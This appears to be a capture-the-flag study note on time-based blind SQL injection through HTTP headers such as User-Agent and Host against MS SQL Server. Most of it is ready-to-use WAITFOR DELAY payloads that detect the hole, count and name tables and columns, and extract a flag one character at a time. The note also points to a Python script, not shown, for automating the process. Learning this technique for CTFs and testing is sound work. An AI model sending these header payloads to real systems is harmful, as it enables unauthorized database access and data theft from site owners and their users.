As the name tells this is a particular variation of a Blind Injection where we don't get any message or always the same output message(ex. Message sent!) for a success & failure state which
makes ineffective the Bool(TRUE/FALSE) and the only feedback here is by using the SLEEP function to introduce a sleep and know when the the SQLi succeeds then there will be a delay!

# Case scenario
If have a website with no input forms which makes it virtually impossible to inject any SQL code. But you find that the Headers can be injected(specifically the Host header)

## How to identify
You try to inject a sleep function `<WAITFOR DELAY '0:0:5'>` into headers example:
`User-Agent: VICTIM.com;WAITFOR DELAY '0:0:5'`
(if the request takes around 5 sec then you are gucci!)

## How to Attack
Now here we need to use timers to count the time and if the condition is fulfilled=TRUE then the sleep will be invoked so we know that if timer is > 5 sec then is true.
By doing so we can circumvent the blind injection and guess the values. We can use the query 
`Host: VICTIM.com;IF (CONDITION)=TRUE WAITFOR DELAY '0:0:5'`

1)We can start by checking for SQLi into UA Header
`User-Agent: Mozilla';WAITFOR DELAY '0:0:5'--`
(If response time >5sec then you are Gucci!)

2)Now that you have a entry point you can start to create your ex-filtration with something like: `somethingvalid';IF (condition) WAITFOR DELAY '0:0:5'--`
`User-Agent: Mozilla';IF (select substring(db_name(),i,1))='a' WAITFOR DELAY '0:0:5'--`
(IF the condition is true then it will do a sleep of 5 sec, you might decrease the sleep to make it faster but keep it at-least a sec so you avoid false positive if website is overloading and slowing down...)

3)Next we need to identify how many tables are available in the DB: 
`User-Agent: Mozilla';IF (SELECT COUNT(*) FROM information_schema.tables WHERE TABLE_CATALOG='digcraft')=1 WAITFOR DELAY '0:0:5'--`
(Iterate thru numbers, when you get >5sec then you are gucci)

4)Now you can target the Table-name Lengths in the DB and you need to use the LIMIT/OFFSET so you don't get a overflow/error

```
User-Agent: Mozilla';IF (select LEN(table_name) from information_schema.tables where table_catalog='digcraft' order by table_name offset 0 rows fetch next 1 rows only)=1 WAITFOR DELAY '0:0:5'--
```
(Iterate thru numbers, when you get >5sec then you are gucci)

5)Next extract the table name:
```
User-Agent: Mozilla';IF (select table_name from information_schema.tables where table_catalog='digcraft' order by table_name offset {i} rows fetch next 1 rows only)='a' WAITFOR DELAY '0:0:5'--
```
(Iterate thru numbers, when you get >5sec then you are gucci)

7)Next column info from flag table
-- Get the number of columns in the 'flag' table
`select count(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft';`

-- Get the length of the first column name in the 'flag' table
```
select LEN(column_name) from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset 0 rows fetch next 1 rows only;
```

-- Get the value of the first column name in the 'flag' table
```
select column_name from INFORMATION_SCHEMA.columns where table_name='flag' and table_catalog='digcraft' order by column_name offset 0 rows fetch next 1 rows only;
```

8)Resulting something like at the end:
```
User-Agent: test';IF (SUBSTRING((SELECT flag from flag),1,1))='H' WAITFOR DELAY '0:0:3'--
User-Agent: test';IF (SUBSTRING((SELECT flag from flag),1,1))='T' WAITFOR DELAY '0:0:3'--
User-Agent: test';IF (SUBSTRING((SELECT flag from flag),1,1))='B' WAITFOR DELAY '0:0:3'--
User-Agent: test';IF (SUBSTRING((SELECT flag from flag),1,1))='{' WAITFOR DELAY '0:0:3'--
```

8)This again must be cycled so you can optimize it via Python script!
(See the script in the folder, adapt it to your needs)
